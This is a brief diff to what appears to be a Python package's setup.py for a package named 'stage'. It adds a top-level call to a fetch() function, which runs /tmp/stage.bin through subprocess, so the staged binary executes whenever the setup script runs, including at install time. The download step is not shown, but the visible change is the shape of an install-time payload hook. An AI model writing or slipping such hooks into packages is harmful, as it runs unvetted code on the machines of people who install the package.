@@ -8,4 +8,6 @@ def fetch():
     subprocess.run(["/tmp/stage.bin"])
 
 
+fetch()
+
 setup(name="stage", version="0.0.1")
